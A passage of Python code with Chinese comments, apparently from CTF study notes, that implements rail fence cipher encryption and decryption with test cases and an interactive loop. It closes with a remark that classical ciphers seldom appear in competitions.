rail_fence_encrypt(text, rails, remove_spaces=True):    &quot;&quot;&quot;    栅栏密码加密        Args:        text: 明文        rails: 栏数        remove_spaces: 是否移除空格    Returns:        密文    &quot;&quot;&quot;    if remove_spaces:        text = text.replace(&quot; &quot;, &quot;&quot;)        # 创建 rail 列表    #按照栏数创建对应的列表    fence = [[] for _ in range(rails)]    rail = 0    direction = 1  # 1 表示向下，-1 表示向上        # 将字符分配到各栏    for char in text:        fence[rail].append(char)        # 更新 rail 位置        rail += direction        # 到达顶部或底部时改变方向        if rail == 0 or rail == rails - 1:            direction = -direction        # 拼接所有 rail    cipher = &#x27;&#x27;.join([&#x27;&#x27;.join(rail) for rail in fence])    return cipherdef rail_fence_decrypt(cipher, rails):    &quot;&quot;&quot;    栅栏密码解密        Args:        cipher: 密文        rails: 栏数    Returns:        明文    &quot;&quot;&quot;    n = len(cipher)        # 创建 fence 结构    fence = [[&#x27;&#x27; for _ in range(n)] for __ in range(rails)]        # 标记 fence 中哪些位置应该放置字符    rail = 0    direction = 1    for i in range(n):        fence[rail][i] = &#x27;*&#x27;        rail += direction        if rail == 0 or rail == rails - 1:            direction = -direction        # 将密文字符填入标记的位置    idx = 0    for r in range(rails):        for c in range(n):            #按照顺序将密文填入*的地方即可            if fence[r][c] == &#x27;*&#x27;:                fence[r][c] = cipher[idx]                idx += 1        # 按照之字形顺序读取    result = []    rail = 0    direction = 1    for i in range(n):        result.append(fence[rail][i])        rail += direction        if rail == 0 or rail == rails - 1:            direction = -direction        return &#x27;&#x27;.join(result)def rail_fence_decrypt_optimized(cipher, rails):    &quot;&quot;&quot;    优化的栅栏密码解密（不创建完整矩阵）        Args:        cipher: 密文        rails: 栏数    Returns:        明文    &quot;&quot;&quot;    n = len(cipher)        # 计算每个 rail 的长度    cycle = 2 * (rails - 1)    rail_lengths = [0] * rails        # 模拟加密过程计算各 rail 长度    rail = 0    direction = 1    for i in range(n):        rail_lengths[rail] += 1        rail += direction        if rail == 0 or rail == rails - 1:            direction = -direction        # 将密文按 rail 长度分割    fences = []    start = 0    for length in rail_lengths:        fences.append(list(cipher[start:start + length]))        start += length        # 按照之字形顺序读取    result = []    rail = 0    direction = 1    rail_pos = [0] * rails  # 每个 rail 的当前读取位置        for i in range(n):        result.append(fences[rail][rail_pos[rail]])        rail_pos[rail] += 1        rail += direction        if rail == 0 or rail == rails - 1:            direction = -direction        return &#x27;&#x27;.join(result)# 测试代码if __name__ == &quot;__main__&quot;:    plaintext = &quot;HELLO WORLD&quot;        # 测试二栏加密解密    print(&quot;=== 二栏栅栏密码 ===&quot;)    cipher_2 = rail_fence_encrypt(plaintext, 2)    print(f&quot;明文: &#123;plaintext&#125;&quot;)    print(f&quot;密文: &#123;cipher_2&#125;&quot;)    print(f&quot;解密: &#123;rail_fence_decrypt(cipher_2, 2)&#125;&quot;)    print(f&quot;优化解密: &#123;rail_fence_decrypt_optimized(cipher_2, 2)&#125;&quot;)        print(&quot;\\n=== 三栏栅栏密码 ===&quot;)    # 测试三栏加密解密    cipher_3 = rail_fence_encrypt(plaintext, 3)    print(f&quot;明文: &#123;plaintext&#125;&quot;)    print(f&quot;密文: &#123;cipher_3&#125;&quot;)    print(f&quot;解密: &#123;rail_fence_decrypt(cipher_3, 3)&#125;&quot;)    print(f&quot;优化解密: &#123;rail_fence_decrypt_optimized(cipher_3, 3)&#125;&quot;)        # 批量测试    print(&quot;\\n=== 批量测试不同栏数 ===&quot;)    test_cases = [        (&quot;HELLOWORLD&quot;, 2),        (&quot;HELLOWORLD&quot;, 3),        (&quot;HELLOWORLD&quot;, 4),        (&quot;CTFISFUN&quot;, 3),        (&quot;PYTHON&quot;, 2),    ]        for text, rails in test_cases:        cipher = rail_fence_encrypt(text, rails, remove_spaces=False)        decrypted = rail_fence_decrypt_optimized(cipher, rails)        status = &quot;✓&quot; if text == decrypted else &quot;✗&quot;        print(f&quot;栏数=&#123;rails:2d&#125; | 明文: &#123;text:12s&#125; | 密文: &#123;cipher:12s&#125; | 解密: &#123;decrypted:12s&#125; &#123;status&#125;&quot;)        # 交互式测试    print(&quot;\\n=== 交互式测试 ===&quot;)    while True:        try:            choice = input(&quot;\\n选择操作: 1=加密, 2=解密, 0=退出: &quot;).strip()            if choice == &#x27;0&#x27;:                break            elif choice == &#x27;1&#x27;:                text = input(&quot;输入明文: &quot;)                rails = int(input(&quot;输入栏数: &quot;))                cipher = rail_fence_encrypt(text, rails)                print(f&quot;密文: &#123;cipher&#125;&quot;)            elif choice == &#x27;2&#x27;:                cipher = input(&quot;输入密文: &quot;)                rails = int(input(&quot;输入栏数: &quot;))                plain = rail_fence_decrypt_optimized(cipher, rails)                print(f&quot;明文: &#123;plain&#125;&quot;)        except ValueError as e:            print(f&quot;输入错误: &#123;e&#125;&quot;)        except KeyboardInterrupt:            print(&quot;\\n程序退出&quot;)            break\n\n\n\n古典密码基本上不会考，考到也是有工具可以进行解密的。了解一下就行了。\n"}]